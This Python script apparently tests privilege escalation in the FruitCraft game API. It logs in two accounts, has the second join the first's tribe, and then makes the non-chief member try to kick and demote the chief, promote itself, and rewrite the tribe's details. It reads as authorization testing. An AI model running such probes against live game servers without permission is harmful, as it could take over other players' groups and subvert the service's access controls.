import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    print("Testing Tribe Privilege Escalation...")
    c1 = FruitClient()
    s1, d1 = c1.login(os.environ.get("TEST_ACC_1_KEY", "REDACTED_KEY_1"), os.environ.get("TEST_ACC_1_UDID", "REDACTED_UDID_1")) # T1
    
    c2 = FruitClient()
    s2, d2 = c2.login(os.environ.get("TEST_ACC_2_KEY", "REDACTED_KEY_2"), os.environ.get("TEST_ACC_2_UDID", "REDACTED_UDID_2")) # T2
    
    t1_id = d1.get("data", {}).get("id")
    t2_id = d2.get("data", {}).get("id")
    
    if not t1_id or not t2_id:
        print("Login failed")
        return

    t1_tribe = d1["data"].get("tribe_name")
    if not t1_tribe:
        print("[+] T1 creating a tribe...")
        res = c1.post("/tribe/create", {"name": f"Vuln{int(time.time())}", "description": "Test", "min_level": 1, "is_open": True})
        print("Create:", res)
        time.sleep(2)
        d1 = c1.get_profile()
        if not d1 or "data" not in d1:
            print("Failed to get profile.")
            return
        t1_tribe = d1["data"].get("tribe_name")
        print("Tribe Created:", t1_tribe)
    else:
        print(f"T1 is in tribe: {t1_tribe}")
        
    t1_tribe_id = d1["data"].get("tribe", {}).get("id") if d1["data"].get("tribe") else 0
    if not t1_tribe_id:
        t_res = c1.post("/tribe/find", {"query": t1_tribe})
        if t_res and "data" in t_res and len(t_res["data"]) > 0:
            t1_tribe_id = t_res["data"][0]["id"]
            
    print(f"Tribe ID: {t1_tribe_id}")
    if not t1_tribe_id:
        print("Could not find tribe ID.")
        return

    t2_tribe = d2["data"].get("tribe_name")
    if t2_tribe != t1_tribe:
        print("[+] T2 joining T1's tribe...")
        if t2_tribe:
            c2.post("/tribe/leave", {})
            time.sleep(2)
            
        join_res = c2.post("/tribe/joinrequest", {"tribe_id": t1_tribe_id})
        print("Join Res:", join_res)
        time.sleep(2)
        
        acc_res = c1.post("/tribe/decidejoin", {"player_id": t2_id, "accept": True})
        print("Accept Res:", acc_res)
        time.sleep(2)
        
    print("\n[+] T2 attempting to kick T1 (Chief)")
    res = c2.post("/tribe/kick", {"tribe_id": t1_tribe_id, "member_id": t1_id})
    print("T2 Kick T1:", res)
    time.sleep(2)

    print("\n[+] T2 attempting to promote themselves")
    res2 = c2.post("/tribe/promote", {"tribe_id": t1_tribe_id, "member_id": t2_id})
    print("T2 Promote T2:", res2)
    time.sleep(2)

    print("\n[+] T2 attempting to demote T1")
    res3 = c2.post("/tribe/demote", {"tribe_id": t1_tribe_id, "member_id": t1_id})
    print("T2 Demote T1:", res3)
    time.sleep(2)

    print("\n[+] T2 attempting to edit tribe details")
    res4 = c2.post("/tribe/edit", {"tribe_id": t1_tribe_id, "description": "Hacked by T2", "is_open": False})
    print("T2 Edit Tribe:", res4)

if __name__ == "__main__":
    main()
